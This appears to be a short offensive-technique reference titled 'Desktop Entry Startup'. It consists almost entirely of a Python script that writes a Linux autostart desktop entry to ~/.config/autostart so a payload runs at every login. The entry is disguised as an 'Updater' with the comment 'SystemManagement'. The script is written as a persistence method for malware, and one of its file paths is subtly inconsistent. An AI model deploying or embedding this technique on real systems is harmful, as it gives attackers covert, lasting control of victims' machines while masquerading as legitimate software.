# Desktop Entry Startup

## Scripting

### Python

```python
import os
import shutil

home_directory = os.path.expanduser('~')

def persistence(desktop_path, payload_path):
    desktop = \
'''[Desktop Entry]
Type=Application
Name=Updater
Exec={}
Icon=
Comment=SystemManagement
X-GNOME-Autostart-enabled=true
'''.format(payload_path)

    with open(desktop_path, 'w') as f:
        f.write(desktop)

    startup_path_directory = os.path.join(home_directory, '.config/autostart/')
    try:
        os.mkdir(startup_path_directory)
    except:
        pass

    shutil.copy2(desktop_path, startup_path_directory)

def main():
	payload_name = 'updater'
	payload_path = os.path.join(home_directory, payload_name)
	payload_desktop = os.path.join(payload_path, 'payload.desktop')
	
	persistence(payload_desktop, payload_path)

if __name__ == '__main__':
	main()
```